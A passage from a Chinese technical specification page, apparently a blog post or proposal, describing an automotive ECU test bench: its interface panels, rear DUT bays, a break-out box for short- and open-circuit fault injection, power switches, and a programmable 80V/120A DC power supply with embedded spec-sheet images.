而保护了敏感的电子设备不受静电干扰。这样的设计不仅提高了设备的稳定性，也延长了车机屏幕等电子设备的使用寿命。</p><p>产品指标参数信息如下：</p></li><li><p>提供16路CAN接口（DB9）,以太网接口12个（RJ45），USB接口2个，插排8个插口（支持3孔和2孔）；</p></li><li><p>具备2个车载以太网转传统以太网调试接口，面板预留T1和TX接口，可在接口面板实现转换；</p></li><li><p>测试台架设备支持实验台与电控系统、负载开关、机柜本体间的连接使用可方便断开和连接的接插件端子台的形式，无需使用工具即可方便快捷的更换电控系统、真实负载及真实开关；</p></li><li><p>测试台架设备的试验台安装方便灵活，控制器能够应用到后续车型中，不需额外改线布局就能在总线之间灵活移动安装</p></li><li><p>电源接口、CAN/CAN-FD/LIN接口、诊断接口等常用测试接口引至测试系统前面板上，高度合适方便测试人员操作；</p></li><li><p>测试系统各部分之间的走线均在台架背面进行，且不影响机柜后门的关闭与打开；</p></li><li><p>所有ECU和负载都可通过标准的接插件在系统正面进行更换，无需使用额外工具，接插件不能外露；</p></li><li><p>所有ECU和负载管脚信号及扩展变型均连接到标准的接插件上；</p></li><li><p>试验台布置与其他测试模块硬件接口位置合理，以便测试系统调用控制配合相应系统集成测试内容验证；</p></li><li><p>试验台与机柜之间的连接均与机柜相匹配，使用特定的某接口，并且满足能够同时与多个机柜连接的要求。</p></li><li><p>面板配备蜂窝区域用于车机屏幕挂载，蜂窝面板黑色、孔径1厘米，与正面齐平，与桌面距离留空距离5厘米；防静电皮的接地线连接至蜂窝板。</p></li></ol><p>台架面板主要是针对对于零部件的测试接口的外露，通过将线束将各零部件接口接到台架面板上，方便测试人员进行相应的测试工作，台架面板具备对应的接口编号，以方便测试人员进行区分。</p><h4 id="技术实现内容-7"><a href="#技术实现内容-7" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><ol><li>方案设计</li></ol><p>多接口支持：提供16路CAN接口、12个以太网接口、2个USB接口、8个插排插口。</p><p>车载网络转换：2个车载以太网转传统以太网接口，预留T1和TX接口。</p><p>便捷连接：使用接插件端子台形式连接实验台与电控系统、负载开关、机柜本体。</p><p>灵活安装：控制器安装方便，可适用于后续车型，无需改线。</p><p>前面板设计：所有常用测试接口引至前面板，高度合适，方便操作。</p><p>走线管理：台架背面走线，不影响机柜后门操作。</p><p>接插件更换：ECU和负载通过前面板标准接插件更换，无需工具。</p><p>硬件接口布局：试验台与其他测试模块硬件接口位置合理，便于系统集成测试。</p><p>机柜连接：试验台与机柜连接匹配，支持与多个机柜同时连接。</p><ol><li>结构设计</li></ol><p>台架尺寸：符合设备布置要求，保证足够的工作空间和操作便利性。</p><p>材质选择：采用防静电材料，确保设备和测试人员的安全。</p><p>接口与连接设计</p><p>接口面板：所有接口均集中在前面板，易于访问和操作。</p><p>接插件端子台：采用标准化接插件，便于快速连接和断开。</p><p>电源管理区：独立的电源设备放置区域，配备必要的电源插口。</p><p>安装与维护</p><p>控制器安装：设计模块化安装架，支持快速更换和升级控制器。</p><p>维护通道：确保走线整洁，维护通道清晰，便于检查和修理。</p><p>车机屏幕挂载区</p><p>蜂窝面板：配备专用于车机屏幕挂载的蜂窝区域，保证屏幕安全稳定地安装。</p><p>防静电处理：蜂窝板连接防静电皮的接地线，防止静电损害敏感元件。</p><ol><li>安全与环境考虑</li></ol><p>防静电措施：整个台架和工作区域均采取防静电措施，包括防静电地面和接地处理。</p><p>人体工程学：台架设计考虑人体工程学，确保测试人员长时间工作的舒适性。</p><p>技术规格</p><p>接口规格：确保所有接口符合行业标准，兼容性强。</p><p>负载能力：台架设计能承受预期的最大负载，保证稳定性。</p><p>网络设备配置：每个台架配备高性能千兆交换机，满足测试需求。</p><ol><li>安全措施</li></ol><p>接插件保护：设计保护措施，避免接插件外露，保证安全。</p><p>电源安全：电源设备区域配备过载保护，确保测试过程中的电源安全。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5e022e7e2e90fc93d1104bef500d93d5.png"></p><p>（测试台架样图）</p><h3 id="台架背面"><a href="#台架背面" class="headerlink" title="台架背面"></a>台架背面</h3><h4 id="功能实施方案-8"><a href="#功能实施方案-8" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>为了确保台架的通风和维护的便捷性，在设计中特别注意到了背面的构造。台架的背板被设计为包含3个后门，这样的设计不仅便于从不同的角度进行内部设备的检查和维护，还有助于实现更好的空气流通，确保设备在运行时的散热效果。</p><p>在台架的设计中，特别考虑了后门的功能性与可访问性。为此，后门被设计为向下延伸，直至桌面位置，这样的结构设计使得操作人员可以轻松地从台架的后方接触到桌面层级的设备。这种延伸设计不仅增加了后门的可用范围，而且提高了对设备进行调整和维护的便捷性。</p><p>在设计台架背板时，采取了一种用户友好的方式来提高可访问性。后门被设计为可以向外开启，这种外开方式的门能够让操作人员更加轻松地打开和关闭，从而便于进行设备的安装、检查及维护工作。这种设计不仅简化了操作流程，还提供最大的空间方便工程人员的检修接线，从而优化了工作区域的使用效率。</p><p>在台架背板的设计中，为了满足不同设备测试的多样性和复杂性，特别强调了接口的数量和类型。为此，每个用于放置设备测试单元（DUT）的格子都包含了8个CAN接口，这些接口采用了标准的DB9型连接器。这种设计能够确保测试台架能够兼容广泛的设备和测试场景，同时提供足够的通信能力，以支持复杂的数据传输需求，确保测试过程的高效和可靠。</p><p>在精心设计的台架中，考虑到了网络调试的需求，特别在两个设备测试单元（DUT）格子中各自集成了1个普通以太网调试口。这样的配置允许工程师通过标准的网络接口对设备进行必要的调试和网络通信测试。这个以太网调试口的加入，大大增强了台架的功能性，使其能够适应各种不同的测试环境和要求，为设备的网络连接性和通信效率提供了可靠的测试手段。</p><p>台架设计中，为了提供更加灵活的调试选项，特别在两个设备测试单元（DUT）格子中各配置了1个USB调试口。这一设计使得工程师可以通过常见的USB接口连接来进行快速而方便的硬件调试和数据传输工作。这种集成方式不仅提高了台架的适用性，也为测试和调试过程带来了额外的便捷性，从而确保了测试流程的高效性和设备调试的灵活性。</p><p>在精心设计的测试台架中，每个设备测试单元（DUT）格子都配备了一组关键的电源接口，包括KLR、KL15、KL30和KL31。这些接口是为了确保与各种设备的兼容性，并且能够提供必要的电源供应和信号模拟。KLR接口通常用于接收控制信号，而KL15接口则提供点火开关信号。KL30和KL31分别提供稳定的电源和地线连接。这一全面的接口配置不仅增强了测试台架的功能性，还确保了在进行设备测试时能够模拟各种工作条件，从而实现更加准确和全面的测试结果。</p><p>测试台架设计中，确保了每一个设备测试单元（DUT）格子包括一组电源接口，这包括VCC和VBAT。VCC接口通常用于提供逻辑电平的电源，而VBAT接口则用于模拟车辆电池的直流电源。这样的配置允许测试台架能够为各种设备提供必要的电源输入，确保在进行功能和耐久性测试时，设备能够在正确的电源条件下运行，从而保证测试的有效性和可靠性。</p><p>测试台架中，为了满足高标准的测试需求，特别设计了每个设备测试单元（DUT）格子，使其包含一组专为控制及信号传输而设的接口，即CNT（RJ45）。这种接口采用了通用的RJ45连接器，能够为测试设备提供稳定可靠的数据交换能力。通过这些CNT接口，测试人员可以轻松地实现对DUT的精确控制和监测，确保信号的有效传输，从而提高整个测试过程的效率和精度。</p><p>在精心设计的测试台架中，共有6个设备测试单元（DUT）格子，每个格子都配备了6个车载以太网（RJ45）接口。这些接口的存在极大地增强了测试台架的网络连接能力，允许每个DUT格子能够同时与多个网络设备或系统进行通信。通过这些车载以太网接口，测试设备可以在真实车辆环境下的网络条件中进行测试，从而确保测试结果的真实性和可靠性。这为模拟复杂的车辆网络环境提供了强有力的支持，使得测试台架能够满足现代汽车电子测试的高要求。</p><p>产品参数指标信息如下：</p><ol><li>背面3个后门；</li><li>后门向下延伸到桌面位置；</li><li>采用外开方式打开；</li><li>每个DUT格子包含8个CAN（DB9）接口；</li><li>台架中有两个DUT格子包含1个普通以太网调试口；</li><li>台架中有两个DUT格子包含1个USB调试口；</li><li>每个DUT格子包含一组KLR、KL15、KL30、KL31接口；</li><li>每个DUT格子包含一组VCC、VBAT接口；</li><li>每个DUT格子包含一组控制及信号传输接口CNT（RJ45）；</li><li>台架中有6个DUT格子带有6个车载以太网（RJ45）接口。</li></ol><h4 id="技术实现内容-8"><a href="#技术实现内容-8" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>台架背板设计主要是要考虑到方便后期维护及测试人员的接线方便等因素，所以本方案的台架背板提供了3个外开后门，台架背板可直接对台架零部件放置区域的接线接口进行维护。</p><ol><li>设计要求</li></ol><p>后门设计：3个后门，外开方式，延伸至桌面位置。</p><p>DUT（Device Under Test）格子：每个格子包含特定的接口配置。</p><p>接口配置：包括CAN接口、以太网接口、USB接口、车辆电源接口、控制及信号传输接口等。</p><ol><li>后门设计</li></ol><p>数量与位置：台架背面配备3个后门，便于设备内部的访问和维护。</p><p>结构：后门向下延伸至桌面位置，保证了足够的开启角度，便于操作。</p><p>开启方式：后门采用外开方式，确保开门时不会干扰台架两侧的工作空间。</p><ol><li>DUT格子设计</li></ol><p>CAN接口配置：每个DUT格子包含8个CAN（DB9）接口，满足多路CAN通信测试需求。</p><p>以太网调试口：两个DUT格子中各包含1个普通以太网调试口，用于网络通信测试。</p><p>USB调试口：两个DUT格子中各包含1个USB调试口，用于设备配置或数据传输。</p><p>车辆电源接口：每个DUT格子包含一组KLR、KL15、KL30、KL31接口，模拟车辆不同电源状态。</p><p>电源输入接口：每个DUT格子包含一组VCC、VBAT接口，提供稳定的电源输入。</p><p>控制及信号传输接口：每个DUT格子包含一组CNT（RJ45）接口，用于控制信号的传输。</p><p>车载以太网接口：6个DUT格子各带有6个车载以太网（RJ45）接口，支持高速车载网络测试。</p><ol><li>其他设计细节</li></ol><p>标准化接口：所有接口均采用行业标准，以保证与各种测试设备的兼容性。</p><p>模块化设计：DUT格子模块化设计，便于未来扩展或更换。</p><p>接口保护：设计接口防护措施，避免在操作过程中对接口造成损害。</p><p>走线管理：内部走线整洁，易于管理，确保信号的传输质量与安全性。</p><p>散热设计：后门设计考虑散热需求，保证设备在长时间运行下的稳定性。</p><p>安全考虑：所有电源接口均有明确的标识和保护措施，防止误操作引起的安全问题。</p><ol><li>安全措施</li></ol><p>防静电设计：所有接口和操作区域均进行防静电设计，确保设备和人员安全。</p><p>电源隔离：电源接口与信号接口物理隔离，减少干扰，提高测试准确性。</p><p>紧急停止按钮：台架配备紧急停止按钮，确保在出现意外时能立即切断电源。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a73d0b7e4ed45595eb1baf56ebe67fe1.png"></p><h3 id="BOB盒"><a href="#BOB盒" class="headerlink" title="BOB盒"></a>BOB盒</h3><h4 id="功能实施方案-9"><a href="#功能实施方案-9" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>的测试台架设备经过精心设计，具备高度灵活性和可控性，特别是在控制器格子的上电控制方面。每个控制器格子都可以独立进行上下电操作，这一过程可以通过BOB（Break-Out Box）控制盒或者控制类板卡控制器来实现。这种设计允许每个控制器格子都能被BOB盒精确控制，进而在集成测试环境中实施高级的故障注入测试，例如短路和断路。此外，无论是采用断线测试盒还是控制类板卡，的系统都支持可编程控制，为测试人员提供了极大的便利。这种可编程特性不仅增强了测试的灵活性，的测试台架可以随着测试需求的变化而轻松扩展，无论是在控制器数量上还是功能上，都能迅速适应新的测试场景。</p><p>产品参数指标信息如下：</p><p>测试台架设备上的每个控制器格子可独立上下电，支持通过BOB控制盒或控制类板卡控制器上电控制，每个控制器格子都能被BOB盒控制，实现集成测试环境下短路/断路等故障注入测试，断线测试盒或者控制类板卡均满足可编程控制，同时数量可扩展。</p><h4 id="技术实现内容-9"><a href="#技术实现内容-9" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>测试台架设备上的每个控制器格子可独立上下电，支持通过BOB控制盒或控制类板卡控制器上电控制，每个控制器格子都能被BOB盒控制，实现集成测试环境下短路/断路等故障注入测试，断线测试盒或者控制类板卡均满足可编程控制，同时数量可扩展。</p><p>概述</p><p>本技术方案旨在构建一个高度可控、灵活的测试台架环境，利用BOB（Break-Out Box）台架盒子实现对测试台架上每个控制器的精准控制。这将支持集成测试环境下的故障注入测试，包括短路、断路等情况，并确保所有控制器格子都能通过BOB盒或控制类板卡进行上电控制。</p><p>核心组件</p><p>BOB台架盒子：作为测试环境的中心枢纽，BOB盒子将提供对每个控制器格子的独立上下电控制，允许测试人员模拟各类故障情况。</p><p>控制类板卡：用于实现对控制器的精细化电源管理，支持编程控制以适应不同的测试场景。</p><p>断线测试盒：配合BOB盒子使用，用于断路测试，提供实时反馈和诊断数据。</p><p>功能特点</p><p>独立上下电控制：每个控制器格子都可以独立控制，不会影响到台架上的其他控制器，提高了测试的灵活性和精确性。</p><p>双重控制机制：既可以通过BOB控制盒进行物理控制，也可以通过控制类板卡实现软件层面的控制，确保测试的便捷性和自动化程度。</p><p>故障注入测试：BOB台架盒子可以模拟短路和断路等多种故障情况，帮助检测控制器在异常状态下的表现。</p><p>可编程控制：断线测试盒和控制类板卡支持可编程控制，允许测试人员根据测试需求编写脚本，实现自定义测试流程。</p><p>可扩展性：系统设计允许在未来根据测试需求增加更多的控制器格子和测试盒，无需更换现有硬件，保护了初期投资。</p><p>硬件集成：将BOB盒子、断线测试盒和控制类板卡集成到测试台架中。</p><p>软件开发：开发控制软件，实现对硬件的编程控制，并提供用户友好的界面。</p><p>测试与验证：执行全面的测试以验证系统的功能和可靠性。</p><h3 id="电源管理模块"><a href="#电源管理模块" class="headerlink" title="电源管理模块"></a>电源管理模块</h3><p>电源管理模块是一种用于管理电力供应和控制电源设备的模块。它通常被用于电子设备或系统中，用于确保电源的稳定供应、有效管理功耗和延长电池寿命。</p><h4 id="功能实施方案-10"><a href="#功能实施方案-10" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>的电源管理模块经过精心设计，以满足多样化的电源控制需求。它支持多种类型的开关，包括总开关、空气开关、操作开关以及应急开关。这些开关的集成确保了用户可以在不同的情况下对电源进行精确控制。总开关允许用户控制整个模块的电源供应，而空气开关则是安全特性，用于在电路异常时迅速切断电源以保护设备。操作开关提供了日常使用中对电源的控制，而应急开关则设计用于紧急情况，允许用户在发生意外时快速断电，增加了系统的安全性。这种全面的电源管理方案为用户提供了极高的操作便利性和安全保障。</p><p>的电源管理模块包含了一系列高规格的控制开关，以确保安全和效率。这些控制开关具有16A的额定电流和440V的额定电压，能够适应大多数工业应用的要求。更为重要的是，它们具备10kA的额定分断电流能力，在电流突然增大时，开关能够迅速断开电路，有效防止电气事故的发生，保障设备和人员的安全。</p><p>产品参数指标信息：</p><ol><li>支持总开关、空气开关、操作开关与应急开关；</li><li>控制开关额定电流16A，额定电压440V，额定分断电流10kA。</li></ol><h3 id="电源模块"><a href="#电源模块" class="headerlink" title="电源模块"></a>电源模块</h3><h4 id="功能实施方案-11"><a href="#功能实施方案-11" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>的电源模块专为实验台设计，其供电功能支持由系统软件统一控制，这使得电源管理既灵活又高效。该模块采用可编程集成电源，可以根据实验需求进行精确的电源调整。用户可以通过系统软件界面简单地编程设定电源输出参数，从而实现对实验台供电的精确控制，确保实验过程中电源的稳定性和可靠性。这种集成化和可编程性大大提高了实验台的使用便捷性和实验的可重复性。</p><h4 id="性能实施方案-1"><a href="#性能实施方案-1" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>电源模块中，用户可以享受到宽广的电压调节范围，该模块提供从0至80V的电压输出。这样的设计使得它可以灵活应对各种不同的电压需求，无论是低电压的精密测试还是稍高电压的强力驱动，都能确保电源模块稳定可靠地工作。</p><p>的电源模块设计具备卓越性能，能够提供最大达到120A的电流输出。这一强大的输出能力确保即便是在高负载的应用场景下，电源模块也能够稳定供电，满足各类设备对电流的需求，从而保障实验和测试的连续性和效率。</p><p>本电源模块拥有卓越的性能表现，其最大功率输出可达到6000W。这样的高功率输出能力使得该模块能够轻松应对各种高能耗设备的供电需求，保障了在高负荷工作条件下的稳定性与可靠性，确保实验和测试的顺利进行。</p><p>的电源模块在设计上注重精确的电压控制，因此特别提供了高解析度的电压设定功能，具体到电压设定值的解析度达到了1mV。用户可以以10毫伏为单位精细调整输出电压，从而实现精确的电压供给，满足对电压精度要求极高的实验和精密设备的需求。</p><p>在电源模块的设计中，电流控制同样至关重要，为了满足精细调节的需求，该模块提供了极高的电流设定值解析度，达到10mA。这样的细致分辨率确保了用户可以以10毫安为最小调节单位来设定所需的电流，极大地增强了对电流输出的精准控制能力，非常适合那些对电流精度有着严格要求的应用场景。</p><p>本电源模块在功能性上具备高度的灵活性，其中一项显著的特性就是支持输出阻抗设定功能。用户不仅能够设定所需的电压和电流，还能够根据实验或应用的具体需求预设电源的输出阻抗。这个功能对于模拟不同电源供应情况或进行特定电气特性测试尤为重要，为用户提供了更多的实验参数控制，从而扩展了电源模块的应用范围。</p><p>本款电源模块在保护功能方面表现卓越，全面支持源过电压保护(OVP)、过电流保护(OCP)、过功率保护(OPP)，以及Vsense反接保护，确保在电压、电流或功率超出设定范围时，系统能够立即响应并采取保护措施，防止对电源模块本身或负载设备造成损害。此外，该模块还具备掉电保护和输入欠压保护功能，进一步提升了使用过程中的安全性能，确保在电源意外中断或输入电压不足时，系统能够保持稳定或安全地关闭，保护连接设备不受影响。这一系列的保护功能使得电源模块在各种应用场景下都能提供可靠的电源供应，并有效避免意外情况下的设备损害。</p><p>为了确保电源输出的准确性和稳定性，的电源模块配备了远端量测功能。这一功能允许模块通过远端检测点来精确测量负载端的实际电压和电流，从而补偿线路损耗，确保电源输出与预设值之间的一致性。远端量测功能对于长距离传输和高精度应用场景尤为重要，它可以显著提高电源管理的效率和可靠性。</p><p>本电源模块提供了模拟量控制接口，该接口允许用户通过模拟信号来控制电源模块的输出。这种控制方式对于需要与传统模拟控制系统集成的应用来说是非常重要的，因为它可以直接接收来自传感器或其他控制设备的变化信号，并据此调整输出。这种模拟量控制接口的设计，不仅确保了与旧有系统的兼容性，还为用户提供了一种直观且灵活的控制手段，以满足特定的应用需求。</p><p>的电源模块设计考虑到了多样化的通讯需求，因此内置了USB、RS232、CAN以及LAN通讯接口。这些接口提供了广泛的连接可能性，使得电源模块可以轻松地与计算机、工业设备或网络系统集成。USB接口便于快速本地连接，RS232接口适用于传统的串行通讯，而CAN接口则是汽车和工业领域中常用的网络通讯标准。LAN接口的加入使得电源模块能够接入局域网络，实现远程控制和监控。这些通讯接口的集成，极大地提升了电源模块的灵活性和适用性，满足了现代电子设备对于通讯接口多样性的需求。</p><p>产品指标参数信息如下：</p><ul><li>产品参数介绍</li></ul><ol><li>电压范围0-80V；</li><li>电流最大120A；</li><li>功率最大6000W，能提供更大的功率输出；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/894a6285fb947e8f30a8e6fd6fb3c02c.png" alt="IMG_256"></p><ol><li>电压设定值解析度：1mV（0.001V）；</li><li>电流设定值解析度：10mA（0.01A）；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/fa940e95de4721e5272bc37e8e8301b4.png" alt="企业微信截图_1705338612190"></p><ol><li>支持输出阻抗设定功能；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b6635386e2fc589ed3227cee5afd65b9.png" alt="IMG_256"></p><ol><li>支持源OVP、OCP、OPP，Vsense反接保护，掉电及输入欠压保护；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/daf60cf069460182d5f3693abf6699e4.png" alt="IMG_256"></p><ol><li>远端量测功能；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0c7b9952ce33a98ce15a954e1eeb0b45.png" alt="IMG_256"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c98cf1d907d0c34535ef247db40b823a.png" alt="IMG_256"></p><ol><li>模拟量控制接口；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/45e9c1aa53dbafea8a76c69f37a58029.png" alt="IMG_256"></p><ol><li>内置USB/RS232/CAN/LAN 通讯接口。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/87a4a5f088dc27b1127e5ea5aa0120f3.png" alt="IMG_256"></p><h4 id="产品截图"><a href="#产品截图" class="headerlink" title="产品截图"></a>产品截图</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6c40df496ab06f5a6e895d3ca6f3d5ec.png" alt="IMG_256"></p><p>可查网址：</p><p><a href="http://www.itechate.com/cn/product/dc-power-supply/IT-M3900B.html">www.itechate.com/cn/product/dc-power-supply/IT-M3900B.html</a></p><h4 id="产品规格书"><a href="#产品规格书" class="headerlink" title="产品规格书"></a>产品规格书</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3a5a140031f09d2d0278ae65eff5fd39.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_00"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b7bd92910cfe8ef5e8f5c17ed8a910fd.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_01"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/18826500f5f9ca51b34422dac12a4a92.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_02"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0c5f408cb41f5f90b1c8e119cafd56a8.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_03"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2ffd6e4622ae65ca625d0fffd0558540.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_04"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d4ccabe658da9449783bd4e01590941b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_05"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9d843542a9a3f8a8f33f135e6ff1d436.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_06"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c5e87efee6fba69dc65ff1a51eeff6aa.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_07"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1c4537391dcdf5982e9b510bc7199053.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_08"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/49255b3048ac5a673c781ad56b892656.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_09"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/191f8c4b0685d534764d98259e1b3018.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_10"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7df9824440c42c980ab34232c000461d.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_11"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6103ef45b1bef4d54faf252e1873fd05.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_12"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/86f178b54778eb8066ac5febfcdd5c2b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_13"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ae5daad9ac9d71162d438c92486656c8.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_14"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e4750c4c38891caa49ed3513aa252b6f.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_15"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7437fddda3d90f99c8540555cc5eadc0.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_16"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/646413a6c1ba2106c30204c8d5f1a9db.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_17"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/088b0cbe8ab5f7d176fe75be19061e29.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_18"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/fb863288cf0a2ff573db82228f6b4824.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_19"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c2d039936f11bf1eea2dd135d7535a50.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_20"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a9a878fd160159fadf641df7a2cd6f0a.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_21"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9ce5c75eb83efd31d4af42ebacb62cf9.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_22"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c02a8d1887e1578399b00fdf5d762171.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_23"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/eeb0f0340325e4578294a19115f17458.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_24"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2415d5a363722f8f25ef7d63e69cfc37.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_25"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9ed7f1ab01ccaaab65b9d9dd5088cd6e.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_26"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7c3fb8b7c8278293d9997139ba6862d7.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_27"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c5bddae5169c1cf2d93e656ee4b468b3.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_28"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/61d7dda71a9ef11d80af5cfc1cefe223.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_29"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b98ebe755a64946809fc8b4100484426.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_30"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c660d4db3be2681491736147a449754b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_31"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/09fcbe0fd6786df04f513b7af48b79f3.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_32"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" 